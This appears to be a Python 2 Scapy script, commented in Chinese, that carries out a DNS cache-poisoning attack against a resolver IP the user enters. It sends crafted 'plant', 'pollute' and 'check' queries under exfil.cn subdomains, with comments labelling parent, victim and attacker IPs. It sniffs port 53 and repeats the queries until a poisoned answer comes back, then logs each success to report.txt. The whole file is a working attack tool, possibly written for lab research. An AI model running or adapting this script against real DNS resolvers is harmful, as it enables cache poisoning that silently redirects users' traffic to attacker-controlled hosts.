#coding=utf-8
from scapy.all import *
import time
import re
import datetime



def plant(ipAddrOfResolver):
    #查询四级域名的A地址
    send(IP(dst=ipAddrOfResolver)/UDP()/DNS(rd=1,ra=1,qd=DNSQR(qname="one5.test3.exfil.cn")))#parent 129.204.137.123
    print "\n  note1：已发送用于“植入缓存”的DNS请求报文\n"
    time.sleep(4)

    send(IP(dst=ipAddrOfResolver)/UDP()/DNS(rd=1,ra=1,qd=DNSQR(qname="two5.sub.test3.exfil.cn")))#victim  129.204.184.140
    print "\n  note2：已发送用于“污染缓存”的DNS请求报文\n"
    time.sleep(4)

    send(IP(dst=ipAddrOfResolver)/UDP()/DNS(rd=1,ra=1,qd=DNSQR(qname="three5.sub.test3.exfil.cn")))#attacker 39.108.238.75
    print "\n  note3：已发送用于“检测污染结果”的DNS请求报文\n"

ipAddrOfResolver = raw_input("Enter DNS resolver IP Address: \n")
plant(ipAddrOfResolver)
n=1

while 1:
    wakeUpPacket=sniff(filter="port 53 ",count=1)
    if not wakeUpPacket[0].haslayer(DNS) or not wakeUpPacket[0].an :
        continue
    ip=wakeUpPacket[0].getlayer(IP)
    dns=wakeUpPacket[0].getlayer(DNS)
    # if (re.search("three[a-zA-Z0-9]*\.sub\.test[a-zA-Z0-9]*\.exfil\.cn",dns.qd.qname) and re.search("129\.204\.137\.123",dns.an.rdata)) :
    if (re.search("three[a-zA-Z0-9]*\.sub\.test[a-zA-Z0-9]*\.exfil\.cn",dns.qd.qname) and re.search("0\.0\.5\.3",dns.an.rdata)) :
        print ("\n 第%d次污染成功! 污染结果已写入当前目录下的文件“report.txt”" %(n))
        with open('report.txt', 'a+') as f:
             f.write(time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))+" , "+dns.qd.qname+" , "+dns.an.rdata+'\n')
        break
    else:
        print ("\n 第%d次污染失败!继续尝试...  ”" %(n))
        print "\n note: continue listening ...  ”"
        n+=1
        plant(ipAddrOfResolver)
        continue

                                                     


   
    